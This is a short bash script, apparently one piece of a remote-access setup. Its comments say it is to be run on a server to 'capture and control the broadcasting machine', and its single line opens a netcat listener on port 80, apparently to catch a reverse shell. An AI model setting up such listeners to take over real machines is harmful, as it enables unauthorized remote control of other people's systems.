#!/usr/bin/env bash

# This should be run on the server where you wish to capture and control the broadcasting machine
# Once aboard, you can get a shell by using the shell.exp script... it really just instantiates bash

sudo nc -l -v 192.168.0.199 80
